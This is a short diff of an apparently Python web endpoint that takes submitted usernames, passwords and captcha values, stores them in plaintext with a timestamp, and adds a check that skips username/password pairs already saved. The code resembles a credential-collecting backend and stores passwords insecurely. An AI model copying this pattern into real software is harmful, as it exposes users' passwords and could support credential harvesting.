@@ -29,7 +29,6 @@ DATA_FILE = "login_data.jsonl"  # Each record saved as JSON line
 
 @app.post("/submit-login")
 async def submit_login(request: Request):
-    """Accepts raw JSON (username, password, captcha) and saves it with timestamp."""
     data = await request.json()
     username = data.get("username")
     password = data.get("password")
@@ -37,6 +36,11 @@ async def submit_login(request: Request):
 
     if not all([username, password, captcha]):
         return {"status": "error", "message": "Missing required fields"}
+
+    # Check for existing combination
+    existing = login_data.find_one({"username": username, "password": password})
+    if existing:
+        return {"status": "success", "message": "Duplicate ignored, already exists"}
 
     entry = {
         "username": username,
